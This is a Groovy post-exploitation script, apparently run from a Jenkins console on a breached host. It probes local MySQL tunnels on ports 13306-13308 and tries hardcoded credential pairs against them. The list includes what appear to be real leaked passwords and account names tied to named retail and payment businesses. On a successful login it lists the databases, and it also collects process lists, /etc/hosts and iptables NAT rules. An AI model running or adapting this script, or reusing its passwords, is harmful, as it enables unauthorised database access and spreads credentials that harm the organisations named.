// CRÍTICO: Hay MySQL tunnels en 127.0.0.1:13306/13307/13308
// Intentar conectar a cada uno y enumerar bases de datos
// Usar java.sql directamente desde Groovy

println "=== MYSQL TUNNEL ENUMERATION ==="
println "Probing 127.0.0.1:13306, 13307, 13308"

def PORTS = [13306, 13307, 13308]
def PASSWORDS = ["", "root", "jenkins", "JenkisLegasy25", "e6LBqIkOI\$PR1XX2oia", 
                 "dtvV50vwfGq5CO9", "plug*spoke!MosqueCloud3col", "claroshop", 
                 "sears", "t1pagos", "password", "mysql", "admin"]
def USERS = ["root", "jenkins", "admin", "sears", "t1pagos", "claroshop", "db_user", "wp_user"]

PORTS.each { port ->
    println "\n--- PORT: ${port} ---"
    // First check what server responded
    try {
        def socket = new Socket("127.0.0.1", port)
        def stream = socket.inputStream
        def banner = new byte[100]
        def len = stream.read(banner, 0, 100)
        socket.close()
        if (len > 0) {
            println "BANNER (${len} bytes): ${new String(banner, 0, len).replaceAll('[^\\x20-\\x7E]', '.')}"
        }
    } catch(e) {
        println "Connection failed: ${e.message}"
        return
    }
    
    // Try MySQL connections
    ["root", "jenkins", "admin"].each { user ->
        ["", "root", "JenkisLegasy25", "e6LBqIkOI\$PR1XX2oia"].each { pass ->
            try {
                def url = "jdbc:mysql://127.0.0.1:${port}/?useSSL=false&allowPublicKeyRetrieval=true&connectTimeout=3000"
                def conn = java.sql.DriverManager.getConnection(url, user, pass)
                println "CONNECTED! Port=${port} user=${user} pass=${pass}"
                
                // List databases
                def stmt = conn.createStatement()
                def rs = stmt.executeQuery("SHOW DATABASES")
                def dbs = []
                while (rs.next()) { dbs << rs.getString(1) }
                println "  DATABASES: ${dbs}"
                
                // Show current user and grants
                rs = stmt.executeQuery("SELECT USER(), VERSION()")
                while (rs.next()) { println "  USER: ${rs.getString(1)} | VERSION: ${rs.getString(2)}" }
                
                conn.close()
            } catch(e) {
                // Silent fail - wrong creds or can't connect
            }
        }
    }
}

println "\n=== CHECKING EXISTING SSH TUNNELS (ps) ==="
try {
    def proc = ["ps", "aux"].execute()
    proc.waitFor()
    def ps = proc.text
    ps.split("\n").each { line ->
        if (line.contains("ssh") || line.contains("tunnel") || line.contains("13306") || 
            line.contains("13307") || line.contains("13308") || line.contains("socat") ||
            line.contains("iptables") || line.contains("mysql")) {
            println "  PS: ${line.trim()}"
        }
    }
} catch(e) {
    println "ps failed: ${e.message}"
}

println "\n=== /etc/hosts FULL ==="
println new File("/etc/hosts").text

println "\n=== iptables rules ==="
try {
    def proc = ["iptables", "-L", "-n", "-t", "nat"].execute()
    proc.waitFor()
    println proc.text
} catch(e) {
    println "iptables: ${e.message}"
}

println "\n=== JAVA MYSQL DRIVER AVAILABLE? ==="
try {
    Class.forName("com.mysql.jdbc.Driver")
    println "com.mysql.jdbc.Driver: AVAILABLE"
} catch(e) {
    println "com.mysql.jdbc.Driver: NOT FOUND - ${e.message}"
}
try {
    Class.forName("com.mysql.cj.jdbc.Driver")
    println "com.mysql.cj.jdbc.Driver: AVAILABLE"
} catch(e) {
    println "com.mysql.cj.jdbc.Driver: NOT FOUND - ${e.message}"
}
try {
    Class.forName("org.mariadb.jdbc.Driver")
    println "org.mariadb.jdbc.Driver: AVAILABLE"
} catch(e) {
    println "org.mariadb.jdbc.Driver: NOT FOUND - ${e.message}"
}
